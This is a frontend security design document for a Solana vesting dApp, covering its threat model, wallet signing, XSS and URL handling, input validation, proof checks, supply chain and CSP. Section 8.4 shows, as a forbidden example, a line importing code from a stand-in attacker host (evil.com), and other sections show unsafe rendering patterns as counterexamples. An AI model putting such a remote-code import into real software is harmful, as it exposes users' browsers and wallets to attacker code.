# Security Design — Velthoryn Vesting Frontend (Geral's Scope)

**Author:** Geral — frontend lead  
**Status:** Week 4 design, Week 6 implementation target  
**Companion docs:** `docs/SECURITY.md` (on-chain security, Lana), `docs/PDD_GERAL.md` (design), `docs/INTEGRATION.md`  
**External references:**
- [OWASP Top 10 Web Application Security Risks](https://owasp.org/www-project-top-ten/)
- [Solana Wallet Standard](https://github.com/wallet-standard/wallet-standard)

---

## §1 Threat Model — Frontend

### Trust boundary diagram

```
╔════════════════════════════════════════════════════════════════════╗
║                    BROWSER (user's machine)                       ║
║                                                                   ║
║  ┌──────────────────────────────────────┐                        ║
║  │           Next.js dApp               │                        ║
║  │                                      │                        ║
║  │  User input ──► Validation ──►       │                        ║
║  │  Build tx    ──► Preview   ──►       │                        ║
║  │  Display chain data ◄── sanitize ◄── │                        ║
║  │                                      │                        ║
║  │  ⚠ NO private keys here             │                        ║
║  │  ⚠ NO server-side secrets            │                        ║
║  │  ⚠ All code is visible to attacker   │                        ║
║  └───────────┬──────────────────────────┘                        ║
║              │                                                    ║
║              ▼ wallet standard protocol                          ║
║  ┌──────────────────────────┐                                    ║
║  │  Wallet Extension        │  TRUSTED — manages private keys    ║
║  │  (Phantom/Solflare)      │  Signs tx only with user approval  ║
║  │  Shows tx preview        │  Never exposes private key to dApp ║
║  └──────────┬───────────────┘                                    ║
╚═════════════╪════════════════════════════════════════════════════╝
              │ signed transaction
              ▼
╔══════════════════════════════════╗
║  Solana RPC (devnet/mainnet)    ║  UNTRUSTED transport
║  IPFS Gateway (proof retrieval) ║  Content-addressable = tamper-evident
╚══════════════════════════════════╝
```

### Threat actors

| Actor | Capability | Goal |
|---|---|---|
| **Malicious website** | XSS injection, phishing clone | Steal wallet approval, display fake data |
| **Compromised RPC** | Return manipulated account data | Trick user into signing bad transaction |
| **Compromised IPFS** | Serve wrong proof data | Prevent claims or trick user into invalid tx |
| **Supply chain attacker** | Inject malicious npm package | Exfiltrate keys, modify transactions |
| **Network eavesdropper** | Intercept HTTP traffic | Read transaction data (mitigated by HTTPS) |

### Assets at risk

| Asset | Location | Impact if compromised |
|---|---|---|
| **Wallet private key** | Wallet extension (never in dApp) | Total loss — all tokens stolen |
| **Transaction integrity** | Built in dApp, signed by wallet | Wrong recipient/amount if tampered pre-sign |
| **Displayed balances** | Fetched from RPC, rendered in UI | User makes decisions based on wrong data |
| **Merkle proofs** | Fetched from IPFS | Claim fails or user wastes tx fees |

---

## §2 Wallet Security

### 2.1 Key management

**Rule: The dApp NEVER touches private keys.**

| Do | Don't |
|---|---|
| Use `useWallet()` hook for signing | Store seed phrases in localStorage |
| Let wallet extension show tx preview | Build a custom key import dialog |
| Use `signTransaction()` from adapter | Access `window.solana` directly |
| Clear wallet state on disconnect | Cache signing credentials |

### 2.2 Transaction signing UX

Every transaction must show the user what they're signing before wallet approval:

```
┌─────────────────────────────────────────┐
│  Confirm Transaction                     │
│                                          │
│  Action: Create Campaign                 │
│  Tokens: 1,000,000 USDC                 │
│  Recipients: 150                         │
│  Vesting: Linear (Jan 2027 - Jan 2028)  │
│                                          │
│  ⚠ This will transfer tokens from your  │
│    wallet to the campaign vault.         │
│                                          │
│  [Cancel]              [Confirm in Wallet]│
└─────────────────────────────────────────┘
```

**Pre-sign verification checklist (code must implement):**

1. Display program ID being called — user can verify it matches expected
2. Show token amount and recipient in human-readable format
3. For destructive actions (cancel, withdraw): show explicit warning
4. Never auto-sign — always require wallet popup confirmation

### 2.3 Wallet connection security

```typescript
// Good: wallet standard auto-detect (no direct window access)
<SolanaWalletProvider wallets={[]} autoConnect>

// Bad: accessing wallet directly
const wallet = (window as any).solana; // NEVER DO THIS
```

**Why `wallets={[]}`:** Auto-detect via wallet standard protocol means:
- No direct `window.solana` access (injection vector)
- No bundling 40+ adapter packages (attack surface)
- Wallet must implement standard protocol (quality filter)

---

## §3 XSS Prevention

### 3.1 Chain-derived data sanitization

**All data from Solana RPC or IPFS is untrusted and must be sanitized before rendering.**

| Data source | Risk | Mitigation |
|---|---|---|
| Campaign metadata | Could contain malicious strings | Sanitize before `dangerouslySetInnerHTML` (but don't use `dangerouslySetInnerHTML`) |
| Wallet addresses | Safe (base58 alphanumeric) | No HTML content possible |
| Token amounts | Numeric, safe | Format with `Intl.NumberFormat`, not string interpolation |
| Event data from `addEventListener` | Could contain crafted strings | Render as text nodes, never as HTML |
| IPFS proof JSON | Could contain arbitrary fields | Parse with strict schema validation, ignore unknown fields |

### 3.2 React's built-in XSS protection

React escapes all values embedded in JSX by default. This protects against most XSS:

```tsx
// Safe — React escapes the value
<p>{campaignName}</p>

// DANGEROUS — bypasses React's escaping
<p dangerouslySetInnerHTML={{ __html: campaignName }} />
```

**Rule: Never use `dangerouslySetInnerHTML` with chain-derived data.**

### 3.3 URL handling

```typescript
// Bad: user-supplied URL rendered as link
<a href={userProvidedUrl}>Click here</a>  // javascript: protocol XSS

// Good: validate URL scheme
function safeUrl(url: string): string | null {
  try {
    const parsed = new URL(url);
    if (parsed.protocol === "https:" || parsed.protocol === "http:") {
      return parsed.toString();
    }
    return null;
  } catch {
    return null;
  }
}
```

---

## §4 Input Validation

### 4.1 Validation rules

All user input must be validated before building transactions.

| Input | Validation | Error message |
|---|---|---|
| **Wallet address** | Valid base58, 32-44 chars, decodes to 32 bytes | "Invalid Solana address" |
| **Token amount** | Positive integer, ≤ u64 max (18,446,744,073,709,551,615), no negative | "Amount must be positive" |
| **Start date** | Unix timestamp, in the future | "Start date must be in the future" |
| **Cliff date** | ≥ start date | "Cliff date must be after start date" |
| **End date** | > cliff date (or > start date if no cliff) | "End date must be after cliff date" |
| **Campaign ID** | Non-negative integer, ≤ u64 max | "Invalid campaign ID" |
| **CSV file** | Valid CSV format, ≤ 10,000 rows, expected columns | "Invalid CSV format" |
| **Release type** | 0, 1, or 2 | "Invalid vesting type" |

### 4.2 Validation timing

```
User types input
  → Inline validation (onChange) — immediate feedback
  → Form validation (onSubmit) — prevent submission
  → Pre-sign validation — verify against chain state
  → Wallet approval — final user confirmation
```

### 4.3 Address validation implementation

```typescript
import { PublicKey } from "@solana/web3.js";

function isValidAddress(address: string): boolean {
  try {
    const pubkey = new PublicKey(address);
    return PublicKey.isOnCurve(pubkey); // filter PDA addresses if needed
  } catch {
    return false;
  }
}
```

### 4.4 Amount validation

```typescript
function isValidAmount(amount: string): boolean {
  try {
    const bn = BigInt(amount);
    return bn > 0n && bn <= 18_446_744_073_709_551_615n; // u64 max
  } catch {
    return false;
  }
}
```

---

## §5 Transaction Building Security

### 5.1 PDA verification

Before sending any transaction, verify PDA derivation matches expected addresses:

```typescript
const [expectedTree] = deriveVestingTree(creator, mint, campaignId);
const fetchedTree = await program.account.vestingTree.fetch(expectedTree);

// Verify the fetched account matches what we expect
assert(fetchedTree.creator.equals(creator));
assert(fetchedTree.mint.equals(mint));
```

### 5.2 Transaction simulation

Before sending, simulate the transaction to catch errors early:

```typescript
const tx = await program.methods
  .claim(leaf, proof)
  .accounts(accounts)
  .transaction();

// Simulate first — catch errors before spending SOL
const simulation = await connection.simulateTransaction(tx);
if (simulation.value.err) {
  // Show user-friendly error, don't send
  const errorCode = parseAnchorError(simulation.value.err);
  showError(ERROR_MESSAGES[errorCode]);
  return;
}

// Simulation passed — now sign and send
await program.methods.claim(leaf, proof).accounts(accounts).rpc();
```

### 5.3 Transaction confirmation

```typescript
// Always wait for confirmation
const sig = await program.methods.claim(leaf, proof).accounts(accounts).rpc();
const confirmation = await connection.confirmTransaction(sig, "confirmed");

if (confirmation.value.err) {
  showError("Transaction failed on-chain");
} else {
  showSuccess("Tokens claimed successfully");
  queryClient.invalidateQueries({ queryKey: ["claimRecord"] });
}
```

### 5.4 Replay protection

Solana handles replay protection via recent blockhash. No additional frontend measures needed. But:
- Set `commitment: "confirmed"` (not "processed") for finality
- Show pending state while awaiting confirmation
- Disable claim button while tx is in flight (prevent double-click)

---

## §6 RPC Endpoint Security

### 6.1 No sensitive data in client-side RPC calls

All Solana RPC calls are read-only queries or transaction submissions. No secrets are sent:

| RPC call | Data sent | Risk |
|---|---|---|
| `getAccountInfo` | PublicKey (public) | None |
| `sendTransaction` | Signed tx (public after broadcast) | None |
| `simulateTransaction` | Unsigned tx | None — simulation is stateless |

### 6.2 RPC endpoint configuration

```typescript
// Environment variable — not hardcoded in source
const RPC_ENDPOINT = process.env.NEXT_PUBLIC_RPC_ENDPOINT ?? "https://api.devnet.solana.com";
```

**For production (mainnet):**
- Use a private RPC endpoint (Helius, QuickNode, Triton)
- Never expose RPC API keys in client-side code
- Rate-limit client requests to prevent abuse
- Use `NEXT_PUBLIC_` prefix only for non-secret values

### 6.3 RPC response validation

```typescript
// Don't trust RPC blindly — verify account data
const account = await program.account.vestingTree.fetch(treePda);

// Verify discriminator (Anchor does this automatically)
// Verify the account belongs to our program (Anchor does this automatically)
// But: verify business logic assertions manually
if (!account.creator.equals(expectedCreator)) {
  throw new Error("Account creator mismatch — possible wrong PDA");
}
```

---

## §7 IPFS / Proof Integrity

### 7.1 Content-addressable verification

IPFS uses content-addressing (CID = hash of content). If content is tampered, CID changes. But:
- Gateway could serve wrong content for a CID (gateway compromise)
- Content could be unpinned (availability, not integrity)

### 7.2 Proof verification before claim

```typescript
// After fetching proof from IPFS, verify against on-chain root BEFORE sending tx
const proofSet = await fetchProofFromIPFS(campaignCid);
const onChainRoot = (await program.account.vestingTree.fetch(treePda)).merkleRoot;

// Recompute root from leaf + proof
const leafHash = hashLeaf(proofSet.leaf);
const computedRoot = recomputeRoot(leafHash, proofSet.proof, proofSet.leafIndex);

if (!Buffer.from(computedRoot).equals(Buffer.from(onChainRoot))) {
  showError("Proof does not match on-chain root. It may be outdated after a root rotation.");
  return; // Don't send the transaction
}
```

### 7.3 IPFS availability fallback

```
Primary:   Pinata gateway (pinata.cloud)
Fallback:  Public IPFS gateway (ipfs.io)
Last resort: Creator provides proof file directly to recipient
```

---

## §8 Supply Chain Security

### 8.1 Dependency audit

**Critical dependencies (have access to wallet interactions):**

| Package | Risk level | Mitigation |
|---|---|---|
| `@coral-xyz/anchor` | Medium | Widely used, actively maintained. Pin version. |
| `@solana/web3.js` | Low | Official Solana SDK. Pin version. |
| `@solana/wallet-adapter-*` | Medium | Official adapters. Pin version. |
| `keccak256` | High | Crypto primitive — wrong output = all claims fail | Pin exact version, golden vector test |
| `merkletreejs` | High | Tree construction — wrong tree = all proofs invalid | Pin exact version, round-trip test |
| `next` | Low | Well-audited framework | Keep updated |

### 8.2 Lockfile integrity

```bash
# Always commit pnpm-lock.yaml
# Use pnpm install --frozen-lockfile in CI
# Review lockfile changes in PRs
```

### 8.3 npm audit

```bash
# Run before each release
cd apps/web && pnpm audit

# Fix critical vulnerabilities immediately
# Document accepted low-severity vulnerabilities
```

### 8.4 No dynamic imports from URLs

```typescript
// NEVER: load code from external URL
import("https://evil.com/malicious.js"); // NEVER

// ALWAYS: import from pinned node_modules
import keccak256 from "keccak256"; // Pinned in package.json
```

---

## §9 Content Security Policy

### 9.1 Recommended CSP headers (Next.js)

```typescript
// next.config.ts
const securityHeaders = [
  {
    key: "Content-Security-Policy",
    value: [
      "default-src 'self'",
      "script-src 'self' 'unsafe-eval'",  // Next.js dev requires eval; remove in prod
      "style-src 'self' 'unsafe-inline'",  // Tailwind + wallet adapter CSS
      "connect-src 'self' https://api.devnet.solana.com https://api.mainnet-beta.solana.com https://gateway.pinata.cloud",
      "img-src 'self' data:",
      "font-src 'self'",
      "frame-src 'none'",
      "object-src 'none'",
    ].join("; "),
  },
  {
    key: "X-Frame-Options",
    value: "DENY",  // Prevent clickjacking
  },
  {
    key: "X-Content-Type-Options",
    value: "nosniff",
  },
  {
    key: "Referrer-Policy",
    value: "strict-origin-when-cross-origin",
  },
];
```

### 9.2 Why each directive

| Directive | Purpose |
|---|---|
| `default-src 'self'` | Block all external resources by default |
| `script-src 'self'` | No inline scripts, no external scripts |
| `connect-src` whitelist | Only allow RPC + IPFS gateway connections |
| `frame-src 'none'` | Prevent embedding in iframes (clickjacking) |
| `object-src 'none'` | Block Flash/Java plugins |

---

## §10 Error Information Leakage

### 10.1 What NOT to expose

| Don't expose | Why | Instead show |
|---|---|---|
| Raw Anchor error objects | May contain internal state info | Mapped human-readable message |
| Stack traces | Reveals code structure | "Something went wrong" + tx link |
| Account addresses of other users | Privacy | Only show connected wallet's data |
| RPC endpoint URL in errors | Reveals infrastructure | Generic "Network error" |

### 10.2 Logging

```typescript
// Development: full error logging
if (process.env.NODE_ENV === "development") {
  console.error("Claim failed:", error);
}

// Production: structured logging without sensitive data
// Log: error code, tx signature (public), timestamp
// Don't log: account data, proof data, user IP
```

---

## §11 Frontend Security Checklist

### Pre-launch (Week 6)

| # | Check | Priority | Status |
|---|---|---|---|
| 1 | No private keys or seed phrases in source code | P0 | ✅ |
| 2 | No `dangerouslySetInnerHTML` with chain data | P0 | ⏳ |
| 3 | All user inputs validated before tx building | P0 | ⏳ |
| 4 | PDA derivation verified against on-chain state | P0 | ⏳ |
| 5 | Transaction simulation before send | P0 | ⏳ |
| 6 | Proof verified against on-chain root before claim | P0 | ⏳ |
| 7 | Claim button disabled while tx in flight | P0 | ⏳ |
| 8 | CSP headers configured | P1 | ⏳ |
| 9 | `pnpm audit` shows 0 critical vulnerabilities | P1 | ⏳ |
| 10 | Error messages don't leak internal state | P1 | ⏳ |
| 11 | No `eval()` or `Function()` in production | P1 | ⏳ |
| 12 | All dependencies pinned in lockfile | P0 | ✅ |
| 13 | Wallet disconnect clears all session state | P1 | ⏳ |
| 14 | HTTPS enforced (no mixed content) | P0 | ⏳ |
| 15 | No sensitive data in `localStorage` or `sessionStorage` | P0 | ✅ |

### Post-launch

| # | Check | Frequency |
|---|---|---|
| 1 | `pnpm audit` | Every release |
| 2 | Review dependency updates for breaking changes | Weekly |
| 3 | Monitor for wallet adapter security advisories | Monthly |
| 4 | CSP violation reporting (if configured) | Continuous |
